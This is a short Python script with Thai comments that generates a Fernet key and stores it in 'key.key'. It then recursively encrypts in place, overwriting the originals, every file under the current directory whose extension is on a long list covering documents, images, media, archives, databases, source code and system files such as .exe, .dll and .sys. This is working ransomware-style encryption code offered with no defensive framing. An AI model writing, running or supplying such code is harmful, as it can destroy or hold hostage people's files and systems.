from cryptography.fernet import Fernet
import os

# ตรวจสอบว่ามีคีย์อยู่แล้วหรือไม่ ถ้าไม่มีให้สร้างใหม่
key_file = "key.key"
if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)
else:
    with open(key_file, "rb") as f:
        key = f.read()

# สร้าง Fernet object
fernet = Fernet(key)

# กำหนดนามสกุลไฟล์ที่ต้องการเข้ารหัส
file_extensions = (".exe", ".dll", ".sys", ".bat", ".cmd", ".msi", ".lnk",
".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".csv",
".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".tif", ".ico",
".mp3", ".wav", ".wma", ".ogg", ".mp4", ".avi", ".mov", ".wmv",
".zip", ".rar", ".7z", ".tar", ".gz",
".db", ".mdb", ".accdb", ".sqlite", ".sql",
".html", ".htm", ".css", ".js", ".php", ".c", ".cpp", ".java", ".cs", ".xml", ".json",
".iso", ".log", ".reg", ".torrent")

# วนลูปเข้ารหัสไฟล์ในทุกโฟลเดอร์
for root, _, files in os.walk(os.getcwd()):  # เดินผ่านทุกไฟล์ในไดเรกทอรีปัจจุบัน
    for file in files:
        if file.endswith(file_extensions) and file != "key.key":
            file_path = os.path.join(root, file)
            
            # อ่านข้อมูลไฟล์
            with open(file_path, "rb") as f:
                data = f.read()
            
            # ตรวจสอบว่าไฟล์ถูกเข้ารหัสแล้วหรือยัง
            try:
                fernet.decrypt(data)  # ถ้า decrypt ผ่าน แสดงว่าไฟล์ถูกเข้ารหัสแล้ว
                print(f"Skipping already encrypted file: {file_path}")
            except:
                encrypted = fernet.encrypt(data)
                
                # เขียนทับไฟล์เดิมด้วยข้อมูลที่เข้ารหัส
                with open(file_path, "wb") as f:
                    f.write(encrypted)
                print(f"Encrypted: {file_path}")
